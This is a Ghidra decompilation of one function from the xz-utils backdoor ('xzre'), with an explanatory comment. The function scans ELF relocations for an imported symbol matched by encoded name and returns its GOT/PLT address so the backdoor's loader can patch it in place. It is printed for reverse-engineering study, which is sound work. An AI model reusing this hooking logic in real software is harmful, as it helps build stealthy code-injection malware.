// /home/kali/xzre-ghidra/xzregh/101DC0_elf_get_reloc_symbol.c
// Function: elf_get_reloc_symbol @ 0x101DC0
// Calling convention: __stdcall
// Prototype: void * __stdcall elf_get_reloc_symbol(elf_info_t * elf_info, Elf64_Rela * relocs, u32 num_relocs, u64 reloc_type, EncodedStringId encoded_string_id)


/*
 * AutoDoc: Generic helper that scans an arbitrary relocation array for undefined symbols of a specific relocation type (e.g., GOT vs PLT) and a specific encoded name. It iterates through `num_relocs`, ensures the relocation type matches `reloc_type`, confirms the associated symbol is really an import (`st_shndx == 0`), and then resolves the symbol name via `get_string_id` before comparing it to `encoded_string_id`. When it finds a match it returns the relocated address (`elfbase + r_offset`) so the caller can patch GOT/PLT entries in place.
 *
 * Each call starts by logging the lookup with `secret_data_append_from_address`, and it immediately aborts if the telemetry helper reports failure. That keeps relocation patching tied to the secret-data accounting path so the loader never quietly rewrites GOT/PLT entries when the recorder is disabled.
 */

#include "xzre_types.h"

void * elf_get_reloc_symbol
                 (elf_info_t *elf_info,Elf64_Rela *relocs,u32 num_relocs,u64 reloc_type,
                 EncodedStringId encoded_string_id)

{
  BOOL telemetry_ok;
  EncodedStringId sym_name_id;
  ulong reloc_index;
  
  telemetry_ok = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x67,5,4);
  reloc_index = 0;
  if (telemetry_ok != FALSE) {
    for (; reloc_index < num_relocs; reloc_index = reloc_index + 1) {
      if ((((relocs->r_info & 0xffffffff) == reloc_type) &&
          (elf_info->dynsym[relocs->r_info >> 0x20].st_shndx == 0)) &&
         (sym_name_id = get_string_id(elf_info->dynstr + elf_info->dynsym[relocs->r_info >> 0x20].st_name,
                                (char *)0x0), sym_name_id == encoded_string_id)) {
        return elf_info->elfbase->e_ident + relocs->r_offset;
      }
      relocs = relocs + 1;
    }
  }
  return (void *)0x0;
}

